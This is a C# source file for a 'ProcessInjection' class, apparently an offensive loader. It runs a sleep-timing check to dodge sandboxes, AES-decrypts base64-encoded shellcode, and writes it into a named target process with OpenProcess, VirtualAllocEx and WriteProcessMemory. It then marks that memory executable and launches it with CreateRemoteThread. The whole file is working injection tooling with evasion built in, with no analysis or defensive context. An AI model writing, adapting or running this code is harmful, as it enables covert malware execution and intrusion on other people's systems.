using System;
using System.Linq;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

[ComVisible(true)]
public class ProcessInjection {
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flProtect, out UInt32 lpflOldProtect);
    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll")]
    static extern void Sleep(uint dwMilliseconds);

    public static byte[] StringToByteArray(String hex) {
        int NumberChars = hex.Length;
        byte[] bytes = new byte[NumberChars / 2];
        for (int i = 0; i < NumberChars; i += 2)
        {
            bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
        }
        return bytes;
    }

    public void Run(string b64, string key, string iv, string target) {
        DateTime t1 = DateTime.Now;
        Sleep(5000);
        double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
        if (t2 < 4.5)
        {
            return;
        }

        // Decrypt shellcode
        Aes aes = Aes.Create();
        byte[] k = StringToByteArray(key);
        byte[] i = StringToByteArray(iv);
        ICryptoTransform decryptor = aes.CreateDecryptor(k, i);
        byte[] buf;
        using (var msDecrypt = new System.IO.MemoryStream(Convert.FromBase64String(b64)))
        {
            using (var csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
            {
                using (var msPlain = new System.IO.MemoryStream())
                {
                    csDecrypt.CopyTo(msPlain);
                    buf = msPlain.ToArray();
                }
            }
        }

        Process[] localByName = Process.GetProcessesByName(target);
        IntPtr hProcess = OpenProcess(0x001F0FFF, false, localByName[0].Id);

        // Allocate RW space for shellcode
        IntPtr lpStartAddress = VirtualAllocEx(hProcess, IntPtr.Zero, (UInt32)buf.Length, 0x3000, 0x04);

        // Copy shellcode into allocated space
        IntPtr outSize;
        WriteProcessMemory(hProcess, lpStartAddress, buf, buf.Length, out outSize);

        // Make shellcode in memory executable
        UInt32 lpflOldProtect;
        VirtualProtectEx(hProcess, lpStartAddress, (UInt32)buf.Length, 0x20, out lpflOldProtect);

        // Execute the shellcode in a new thread
        CreateRemoteThread(hProcess, IntPtr.Zero, 0, lpStartAddress, IntPtr.Zero, 0, IntPtr.Zero);
    }
}